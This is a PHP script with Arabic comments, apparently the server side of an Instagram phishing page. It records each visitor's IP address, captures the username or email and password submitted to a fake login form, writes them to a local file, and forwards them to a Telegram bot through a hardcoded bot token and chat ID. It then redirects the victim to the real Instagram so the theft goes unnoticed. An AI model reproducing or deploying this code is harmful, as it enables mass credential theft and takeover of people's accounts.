<?php
// إعدادات Telegram
$botToken = '5984403789:AAG0N8ThL71h4mIxPuIb4F863OyZurWBM8A';
$chatId = '5322402925';

// تضمين معالج Telegram
require_once('../../telegram_handler.php');

// حفظ IP في ملف
$ip = $_SERVER['REMOTE_ADDR'] ?? 'غير معروف';
file_put_contents('ip.txt', $ip . "\n", FILE_APPEND);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // استخراج البيانات من Instagram
    $username = $_POST['username'] ?? $_POST['email'] ?? 'غير متاح';
    $password = $_POST['password'] ?? 'غير متاح';

    // حفظ في ملف محلي
    $data = "Username: $username | Password: $password | IP: $ip | Time: " . date('Y-m-d H:i:s') . "\n";
    file_put_contents('usernames.txt', $data, FILE_APPEND);

    // إرسال إلى Telegram
    if ($username !== 'غير متاح' && $password !== 'غير متاح') {
        logCredentials('Instagram', $username, $password, $ip, $botToken, $chatId);
    }

    // إعادة توجيه للصفحة الرئيسية لInstagram
    header('Location: https://www.instagram.com/');
    exit();
}
?>